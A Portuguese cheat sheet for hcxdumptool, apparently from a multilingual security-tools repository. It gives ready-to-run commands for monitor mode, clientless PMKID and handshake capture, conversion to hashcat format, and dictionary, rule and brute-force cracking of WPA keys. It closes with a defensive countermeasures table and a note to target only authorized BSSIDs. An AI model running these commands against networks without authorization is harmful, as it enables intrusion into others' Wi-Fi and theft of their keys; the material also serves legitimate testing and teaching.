<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# folha de dicas do hcxdumptool

[hcxdumptool](https://github.com/ZerBea/hcxdumptool) é uma ferramenta moderna e de alto desempenho para ataque Wi-Fi de linha de comando e captura de pacotes. Ao contrário das ferramentas herdadas do Aircrack-ng, o `hcxdumptool` captura quadros WPA/WPA2/WPA3 PMKID (Pairwise Master Key Identifier) ​​sem exigir clientes conectados, captura handshakes EAPOL de 4 vias e integra-se diretamente ao `hcxtools` para cracking Hashcat (modo 22000).

---

## Índice

- [Principais Vantagens e Arquitetura Moderna](#core-advantages--modern-architecture)
- [Instalação (`hcxdumptool` e `hcxtools`)](#installation-hcxdumptool--hcxtools)
- [Configuração da interface sem fio](#wireless-interface-setup)
- [Capturando PMKID (ataque sem cliente)](#capturing-pmkid-clientless-attack)
- [Convertendo capturas com `hcxpcapngtool`](#converting-captures-with-hcxpcapngtool)
- [Hashcat Cracking (Modo 22000)](#hashcat-cracking-mode-22000)
- [Filtrando canais e BSSIDs](#filtering-channels-and-bssids)
- [Contramedidas defensivas e WPA3](#contramedidas defensivas--wpa3)

---

## Principais vantagens e arquitetura moderna

- **Ataque PMKID sem cliente:** Explora o recurso PMKID RSN IE (Robust Security Network Information Element) em roteadores modernos. Você **não** precisa de um cliente conectado ou de pacotes de desautenticação para capturar o material da chave.
- **Modo Hashcat unificado 22000:** Gera arquivos hash nativos do Hashcat com suporte para handshakes PMKID e WPA-PBKDF2-PMK completos.
- **Channel Hopping & Active Interrogation:** Transmite solicitações de associação direcionadas para extrair PMKIDs de APs de escuta.

---

## Instalação (`hcxdumptool` e `hcxtools`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y hcxdumptool hcxtools

# Arch Linux / BlackArch
sudo pacman -S hcxdumptool hcxtools

# Verify versions
hcxdumptool --version
hcxpcapngtool --version
```
---

## Configuração de interface sem fio

Antes de executar o `hcxdumptool`, encerre os serviços de gerenciamento de rede em segundo plano que interferem na injeção de pacotes brutos:
```bash
# 1. Terminate interfering network services (NetworkManager, wpa_supplicant)
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# 2. Put wireless card in monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# 3. Verify monitor mode
iw dev
```
---

## Capturando PMKID (ataque sem cliente)

### 1. Captura PMKID geral em todos os canais de 2,4 GHz e 5 GHz
Capture todos os pontos de acesso próximos em um arquivo `.pcapng`:
```bash
sudo hcxdumptool -i wlan0 -w capture.pcapng --rds=1
```
- `-i wlan0`: Interface de monitor sem fio.
- `-w capture.pcapng`: Arquivo de captura de saída.
- `--rds=1`: Transmite quadros RTS para solicitar respostas de AP.

### 2. Capture um ponto de acesso de destino específico (filtro BSSID)
Direcione apenas um BSSID autorizado para evitar afetar roteadores de terceiros não autorizados:

1. Crie uma lista de filtros de destino (`target_bssid.txt`):
```text
001122334455
```
*(BSSID sem dois pontos)*

2. Execute a captura direcionada:
```bash
sudo hcxdumptool -i wlan0 -w target.pcapng --bpfp=target_bssid.txt -c 6
```
- `-c 6`: Injeção de bloqueio e escuta no canal 6.
- `--bpfp`: aplica lista BPF (Berkeley Packet Filter) para BSSIDs de destino.

---

## Convertendo capturas com `hcxpcapngtool`

Depois que os quadros PMKIDs ou EAPOL forem coletados, converta a captura `.pcapng` em um formato compatível com Hashcat:
```bash
hcxpcapngtool -o hash.hc22000 -E essid_list.txt capture.pcapng
```
- `-o hash.hc22000`: Arquivo hash de saída no formato Hashcat moderno.
- `-E essid_list.txt`: Salve nomes de rede descobertos (ESSIDs) em um dicionário para quebra de senha direcionada.
- A ferramenta informa o total de frames PMKID e EAPOL extraídos.

---

## Quebra de Hashcat (Modo 22000)

O modo `22000` é o modo de cracking WPA-PBKDF2-PMKID + EAPOL unificado do Hashcat:

### 1. Ataque de dicionário
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```
### 2. Ataque de mutação baseado em regras
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
### 3. Máscara / ataque de força bruta (senhas numéricas de 8 dígitos)
```bash
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```
---

## Filtrando canais e BSSIDs

Otimize a velocidade de captura restringindo os parâmetros de digitalização:
```bash
# Scan only specific channels (e.g. 1, 6, 11)
sudo hcxdumptool -i wlan0 -w filtered.pcapng -c 1,6,11
```
---

## Contramedidas defensivas e WPA3

| Vulnerabilidade | Mecanismo de Ataque | Recomendação de Defesa |
|---|---|---|
| **Cache PMKID** | AP transmite PMKID no quadro EAPOL 1 sem autenticação de cliente | Desative 802.11r (Transição Rápida/Roaming) se não for necessário; atualizar o firmware do roteador. |
| **Chave pré-compartilhada WPA2 fraca** | Quebra de dicionário PBKDF2 offline (modo Hashcat 22000) | Aplique senhas aleatórias com mais de 16 caracteres. |
| **Protocolo WPA2 legado** | Suscetível a PMKID e captura de handshake | Atualize para **WPA3-Personal (SAE)**; WPA3 usa handshake Dragonfly com sigilo de encaminhamento, tornando os quadros capturados indecifráveis ​​offline. |